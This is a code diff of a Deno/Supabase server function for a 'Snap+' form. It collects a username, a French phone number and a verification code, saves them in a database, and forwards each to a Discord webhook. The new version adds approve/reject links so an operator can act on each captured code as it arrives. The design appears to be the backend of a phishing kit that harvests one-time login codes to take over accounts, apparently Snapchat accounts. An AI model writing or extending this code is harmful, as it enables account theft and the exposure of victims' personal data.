@@ -1,4 +1,5 @@
 import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
+import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
 
 const corsHeaders = {
   'Access-Control-Allow-Origin': '*',
@@ -13,39 +14,73 @@ serve(async (req) => {
   }
 
   try {
-    const { username, phone, code, step } = await req.json();
+    const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
+    const supabaseKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
+    const supabase = createClient(supabaseUrl, supabaseKey);
 
-    let content = "";
-    let color = 0xFFD700; // Gold color
+    const { username, phone, code, step, submissionId } = await req.json();
 
+    // Si c'est le formulaire initial, créer une entrée
     if (step === "form") {
-      content = `🆕 **Nouvelle soumission Snap+**\n\n👤 **Username:** ${username}\n📱 **Téléphone:** +33${phone}`;
-    } else if (step === "code") {
-      content = `🔐 **Code reçu**\n\n👤 **Username:** ${username}\n📱 **Téléphone:** +33${phone}\n🔑 **Code:** ${code}`;
+      const { data, error } = await supabase
+        .from('submissions')
+        .insert({ username, phone, status: 'pending' })
+        .select()
+        .single();
+
+      if (error) throw error;
+
+      const callbackUrl = `${supabaseUrl}/functions/v1/submission-callback`;
+      
+      const embed = {
+        title: "📱 Nouveau formulaire Snap+",
+        description: `🆕 **Nouvelle soumission**\n\n👤 **Username:** ${username}\n📱 **Téléphone:** +33${phone}`,
+        color: 0xFFD700,
+        timestamp: new Date().toISOString(),
+        footer: { text: `ID: ${data.id}` }
+      };
+
+      await fetch(DISCORD_WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ embeds: [embed] }),
+      });
+
+      return new Response(JSON.stringify({ success: true, submissionId: data.id }), {
+        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
+      });
     }
 
-    const embed = {
-      title: step === "form" ? "📱 Nouveau formulaire Snap+" : "🔐 Code de vérification",
-      description: content,
-      color: color,
-      timestamp: new Date().toISOString(),
-      footer: {
-        text: "Snap+ Verification System"
-      }
-    };
+    // Si c'est le code, mettre à jour et envoyer pour validation
+    if (step === "code" && submissionId) {
+      await supabase
+        .from('submissions')
+        .update({ code, status: 'pending' })
+        .eq('id', submissionId);
 
-    const response = await fetch(DISCORD_WEBHOOK_URL, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        embeds: [embed]
-      }),
-    });
+      const callbackUrl = `${supabaseUrl}/functions/v1/submission-callback`;
 
-    if (!response.ok) {
-      throw new Error(`Discord webhook failed: ${response.status}`);
+      const embed = {
+        title: "🔐 Code de vérification reçu",
+        description: `👤 **Username:** ${username}\n📱 **Téléphone:** +33${phone}\n🔑 **Code:** ${code}\n\n**Pour valider:** \`/approve ${submissionId}\`\n**Pour refuser:** \`/reject ${submissionId}\``,
+        color: 0xFFD700,
+        timestamp: new Date().toISOString(),
+        footer: { text: `ID: ${submissionId}` },
+        fields: [
+          { name: "✅ Approuver", value: `${callbackUrl}?id=${submissionId}&action=approve`, inline: true },
+          { name: "❌ Refuser", value: `${callbackUrl}?id=${submissionId}&action=reject`, inline: true }
+        ]
+      };
+
+      await fetch(DISCORD_WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ embeds: [embed] }),
+      });
+
+      return new Response(JSON.stringify({ success: true }), {
+        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
+      });
     }
 
     return new Response(JSON.stringify({ success: true }), {
